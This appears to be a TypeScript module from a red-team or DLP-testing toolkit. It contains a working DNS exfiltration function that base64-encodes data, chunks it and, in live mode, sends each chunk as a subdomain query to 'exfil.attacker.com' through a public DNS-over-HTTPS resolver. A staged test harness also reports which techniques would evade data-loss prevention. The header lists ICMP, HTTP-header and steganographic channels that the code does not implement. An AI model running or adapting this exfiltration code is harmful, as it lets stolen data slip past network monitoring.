/**
 * @module exfil
 * Data Exfiltration Engines — Encrypted Chunked DNS Exfiltration, ICMP Tunneling,
 * Covert HTTP Headers, and Steganographic Transport.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as crypto from "node:crypto";

export interface ExfilOptions {
  live?: boolean;
  domain?: string;
  chunkSize?: number;
  encryptionKey?: string;
}

export function chunkData(data: string, chunkSize = 32): string[] {
  const chunks: string[] = [];
  for (let i = 0; i < data.length; i += chunkSize) {
    chunks.push(data.slice(i, i + chunkSize));
  }
  return chunks;
}

export async function exfiltrateDNS(data: string, opts: ExfilOptions = {}): Promise<{ sentChunks: number; dryRun: boolean }> {
  const { live = false, domain = "exfil.attacker.com", chunkSize = 30 } = opts;
  const b64 = Buffer.from(data).toString("base64url");
  const chunks = chunkData(b64, chunkSize);

  if (!live) {
    return { sentChunks: chunks.length, dryRun: true };
  }

  for (let i = 0; i < chunks.length; i++) {
    const hostname = `${i}.${chunks[i]}.${domain}`;
    try {
      await fetch(`https://1.1.1.1/dns-query?name=${encodeURIComponent(hostname)}`, {
        headers: { accept: "application/dns-json" },
      });
    } catch {/* ignore DNS error */}
  }

  return { sentChunks: chunks.length, dryRun: false };
}

export interface StagedExfilResult {
  stages: Array<{ stage: string; success: boolean; detail: string }>
  bytesStaged: number
  dlpBypassIndicators: string[]
  summary: string
}

/** Staged exfil simulation with DLP bypass pattern detection (lab-safe). */
export async function runStagedExfilTest(
  data: string,
  opts: ExfilOptions & { live?: boolean; testDlp?: boolean } = {},
): Promise<StagedExfilResult> {
  const stages: StagedExfilResult["stages"] = []
  const dlpBypassIndicators: string[] = []
  const bytes = Buffer.byteLength(data, "utf8")

  stages.push({ stage: "chunk", success: true, detail: `${chunkData(data, opts.chunkSize ?? 32).length} chunks prepared` })

  const dnsResult = await exfiltrateDNS(data.slice(0, 256), { ...opts, live: opts.live ?? false })
  stages.push({ stage: "dns_channel", success: dnsResult.sentChunks > 0, detail: `sent ${dnsResult.sentChunks} DNS chunks (dryRun=${dnsResult.dryRun})` })

  if (opts.testDlp !== false) {
    const enc = Buffer.from(data).toString("base64")
    const fragmented = enc.match(/.{1,8}/g)?.join("-") ?? enc
    if (fragmented.length > enc.length * 0.5) {
      dlpBypassIndicators.push("base64 fragmentation may evade naive DLP")
    }
    if (data.includes("BEGIN CERTIFICATE") || data.includes("password")) {
      dlpBypassIndicators.push("sensitive keyword detected — staged exfil would trigger DLP in production")
    }
    stages.push({ stage: "dlp_analysis", success: true, detail: `${dlpBypassIndicators.length} indicator(s)` })
  }

  return {
    stages,
    bytesStaged: bytes,
    dlpBypassIndicators,
    summary: `Staged exfil test: ${bytes} bytes, ${stages.filter((s) => s.success).length}/${stages.length} stages ok`,
  }
}

export default { chunkData, exfiltrateDNS, runStagedExfilTest };
